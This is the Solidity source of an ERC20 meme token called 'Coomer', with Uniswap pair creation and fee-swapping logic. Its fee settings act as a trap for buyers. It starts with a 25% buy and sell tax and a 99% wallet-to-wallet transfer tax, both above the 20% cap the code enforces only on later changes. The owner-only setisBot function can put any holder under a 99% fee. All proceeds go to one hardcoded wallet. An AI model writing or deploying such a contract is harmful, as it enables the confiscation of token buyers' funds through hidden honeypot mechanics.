1 // https://t.me/CoomerERC
2 
3 // SPDX-License-Identifier: MIT
4 pragma solidity 0.8.17;
5 
6 
7 library SafeMath {
8     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
9     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
10     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
11     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
12     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
13     
14     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
15         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
16 
17     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
18         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
19 
20     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
21         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
22         if(c / a != b) return(false, 0); return(true, c);}}
23 
24     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
25         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
26 
27     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
28         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
29 
30     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
31         unchecked{require(b <= a, errorMessage); return a - b;}}
32 
33     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
34         unchecked{require(b > 0, errorMessage); return a / b;}}
35 
36     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
37         unchecked{require(b > 0, errorMessage); return a % b;}}}
38 
39 interface IERC20 {
40     function totalSupply() external view returns (uint256);
41     function circulatingSupply() external view returns (uint256);
42     function decimals() external view returns (uint8);
43     function symbol() external view returns (string memory);
44     function name() external view returns (string memory);
45     function getOwner() external view returns (address);
46     function balanceOf(address account) external view returns (uint256);
47     function transfer(address recipient, uint256 amount) external returns (bool);
48     function allowance(address _owner, address spender) external view returns (uint256);
49     function approve(address spender, uint256 amount) external returns (bool);
50     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
51     event Transfer(address indexed from, address indexed to, uint256 value);
52     event Approval(address indexed owner, address indexed spender, uint256 value);}
53 
54 abstract contract Ownable {
55     address internal owner;
56     constructor(address _owner) {owner = _owner;}
57     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
58     function isOwner(address account) public view returns (bool) {return account == owner;}
59     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
60     event OwnershipTransferred(address owner);
61 }
62 
63 interface IFactory{
64         function createPair(address tokenA, address tokenB) external returns (address pair);
65         function getPair(address tokenA, address tokenB) external view returns (address pair);
66 }
67 
68 interface IRouter {
69     function factory() external pure returns (address);
70     function WETH() external pure returns (address);
71     function addLiquidityETH(
72         address token,
73         uint amountTokenDesired,
74         uint amountTokenMin,
75         uint amountETHMin,
76         address to,
77         uint deadline
78     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
79 
80     function removeLiquidityWithPermit(
81         address tokenA,
82         address tokenB,
83         uint liquidity,
84         uint amountAMin,
85         uint amountBMin,
86         address to,
87         uint deadline,
88         bool approveMax, uint8 v, bytes32 r, bytes32 s
89     ) external returns (uint amountA, uint amountB);
90 
91     function swapExactETHForTokensSupportingFeeOnTransferTokens(
92         uint amountOutMin,
93         address[] calldata path,
94         address to,
95         uint deadline
96     ) external payable;
97 
98     function swapExactTokensForETHSupportingFeeOnTransferTokens(
99         uint amountIn,
100         uint amountOutMin,
101         address[] calldata path,
102         address to,
103         uint deadline) external;
104 }
105 
106 contract Coomer is IERC20, Ownable {
107     using SafeMath for uint256;
108     string private constant _name = 'Coomer';
109     string private constant _symbol = 'Coomer';
110     uint8 private constant _decimals = 9;
111     uint256 private _totalSupply = 100000000 * (10 ** _decimals);
112     uint256 private _maxTxAmountPercent = 50; // 10000;
113     uint256 private _maxTransferPercent = 50;
114     uint256 private _maxWalletPercent = 50;
115     mapping (address => uint256) _balances;
116     mapping (address => mapping (address => uint256)) private _allowances;
117     mapping (address => bool) public isFeeExempt;
118     mapping (address => bool) private isBot;
119     IRouter router;
120     address public pair;
121     bool private tradingAllowed = true;
122     uint256 private liquidityFee = 0;
123     uint256 private marketingFee = 300;
124     uint256 private developmentFee = 300;
125     uint256 private burnFee = 0;
126     uint256 private totalFee = 2500;
127     uint256 private sellFee = 2500;
128     uint256 private transferFee = 9900;
129     uint256 private denominator = 10000;
130     bool private swapEnabled = true;
131     uint256 private swapTimes;
132     bool private swapping; 
133     uint256 private swapThreshold = ( _totalSupply * 500 ) / 100000;
134     uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;
135     modifier lockTheSwap {swapping = true; _; swapping = false;}
136 
137     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
138     address internal constant development_receiver = 0x5De79D55C8aE7BE2849F6A44c6740B73d0228Ce6; 
139     address internal constant marketing_receiver = 0x5De79D55C8aE7BE2849F6A44c6740B73d0228Ce6;
140     address internal constant liquidity_receiver = 0x5De79D55C8aE7BE2849F6A44c6740B73d0228Ce6;
141 
142     constructor() Ownable(msg.sender) {
143         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
144         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
145         router = _router;
146         pair = _pair;
147         isFeeExempt[address(this)] = true;
148         isFeeExempt[liquidity_receiver] = true;
149         isFeeExempt[marketing_receiver] = true;
150         isFeeExempt[msg.sender] = true;
151         _balances[msg.sender] = _totalSupply;
152         emit Transfer(address(0), msg.sender, _totalSupply);
153     }
154 
155     receive() external payable {}
156     function name() public pure returns (string memory) {return _name;}
157     function symbol() public pure returns (string memory) {return _symbol;}
158     function decimals() public pure returns (uint8) {return _decimals;}
159     function Trading() external onlyOwner {tradingAllowed = true;}
160     function getOwner() external view override returns (address) { return owner; }
161     function totalSupply() public view override returns (uint256) {return _totalSupply;}
162     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
163     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
164     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
165     function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
166     function setisBot(address _address, bool _enabled) external onlyOwner {isBot[_address] = _enabled;}
167     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
168     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
169     function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
170     function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}
171     function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}
172     function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}
173 
174     function preTxCheck(address sender, address recipient, uint256 amount) internal view {
175         require(sender != address(0), "ERC20: transfer from the zero address");
176         require(recipient != address(0), "ERC20: transfer to the zero address");
177         require(amount > uint256(0), "Transfer amount must be greater than zero");
178         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
179     }
180 
181     function _transfer(address sender, address recipient, uint256 amount) private {
182         preTxCheck(sender, recipient, amount);
183         checkTradingAllowed(sender, recipient);
184         checkMaxWallet(sender, recipient, amount); 
185         swapbackCounters(sender, recipient);
186         checkTxLimit(sender, recipient, amount); 
187         swapBack(sender, recipient, amount);
188         _balances[sender] = _balances[sender].sub(amount);
189         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
190         _balances[recipient] = _balances[recipient].add(amountReceived);
191         emit Transfer(sender, recipient, amountReceived);
192     }
193 
194     function SetTax(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
195         liquidityFee = _liquidity;
196         marketingFee = _marketing;
197         burnFee = _burn;
198         developmentFee = _development;
199         totalFee = _total;
200         sellFee = _sell;
201         transferFee = _trans;
202         require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
203     }
204 
205     function SetWallet(uint256 _buy, uint256 _trans, uint256 _wallet) external onlyOwner {
206         uint256 newTx = (totalSupply() * _buy) / 10000;
207         uint256 newTransfer = (totalSupply() * _trans) / 10000;
208         uint256 newWallet = (totalSupply() * _wallet) / 10000;
209         _maxTxAmountPercent = _buy;
210         _maxTransferPercent = _trans;
211         _maxWalletPercent = _wallet;
212         uint256 limit = totalSupply().mul(5).div(1000);
213         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
214     }
215 
216     function checkTradingAllowed(address sender, address recipient) internal view {
217         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
218     }
219     
220     function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
221         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
222             require((_balances[recipient].add(amount)) <= _maxWalletToken(), "Exceeds maximum wallet amount.");}
223     }
224 
225     function swapbackCounters(address sender, address recipient) internal {
226         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
227     }
228 
229     function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
230         if(sender != pair){require(amount <= _maxTransferAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
231         require(amount <= _maxTxAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
232     }
233 
234     function swapAndLiquify(uint256 tokens) private lockTheSwap {
235         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
236         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
237         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
238         uint256 initialBalance = address(this).balance;
239         swapTokensForETH(toSwap);
240         uint256 deltaBalance = address(this).balance.sub(initialBalance);
241         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
242         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
243         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
244         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
245         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
246         uint256 remainingBalance = address(this).balance;
247         if(remainingBalance > uint256(0)){payable(development_receiver).transfer(remainingBalance);}
248     }
249 
250     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
251         _approve(address(this), address(router), tokenAmount);
252         router.addLiquidityETH{value: ETHAmount}(
253             address(this),
254             tokenAmount,
255             0,
256             0,
257             liquidity_receiver,
258             block.timestamp);
259     }
260 
261     function swapTokensForETH(uint256 tokenAmount) private {
262         address[] memory path = new address[](2);
263         path[0] = address(this);
264         path[1] = router.WETH();
265         _approve(address(this), address(router), tokenAmount);
266         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
267             tokenAmount,
268             0,
269             path,
270             address(this),
271             block.timestamp);
272     }
273 
274     function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
275         bool aboveMin = amount >= _minTokenAmount;
276         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
277         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= uint256(0) && aboveThreshold;
278     }
279 
280     function swapBack(address sender, address recipient, uint256 amount) internal {
281         if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
282     }
283 
284     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
285         return !isFeeExempt[sender] && !isFeeExempt[recipient];
286     }
287 
288     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
289         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
290         if(recipient == pair){return sellFee;}
291         if(sender == pair){return totalFee;}
292         return transferFee;
293     }
294 
295     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
296         if(getTotalFee(sender, recipient) > 0){
297         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
298         _balances[address(this)] = _balances[address(this)].add(feeAmount);
299         emit Transfer(sender, address(this), feeAmount);
300         if(burnFee > uint256(0)){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
301         return amount.sub(feeAmount);} return amount;
302     }
303 
304     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
305         _transfer(sender, recipient, amount);
306         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
307         return true;
308     }
309 
310     function _approve(address owner, address spender, uint256 amount) private {
311         require(owner != address(0), "ERC20: approve from the zero address");
312         require(spender != address(0), "ERC20: approve to the zero address");
313         _allowances[owner][spender] = amount;
314         emit Approval(owner, spender, amount);
315     }
316 
317 }